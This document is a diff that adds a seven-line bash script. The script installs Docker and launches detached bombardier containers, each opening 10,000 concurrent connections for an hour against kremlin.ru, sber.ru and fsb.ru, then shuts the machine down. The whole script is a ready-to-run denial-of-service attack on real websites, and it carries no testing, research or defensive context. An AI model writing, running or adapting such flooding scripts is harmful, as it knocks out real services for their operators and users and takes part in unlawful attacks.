@@ -1,0 +1,7 @@
+#!/bin/bash 
+apt update 
+apt install docker.io -yq 
+docker run -d --rm alpine/bombardier -c 10000 -d 3600s -l kremlin.ru
+docker run -d --rm alpine/bombardier -c 10000 -d 3600s -l sber.ru
+docker run -d --rm alpine/bombardier -c 10000 -d 3600s -l fsb.ru
+sleep 3900; shutdown -h now
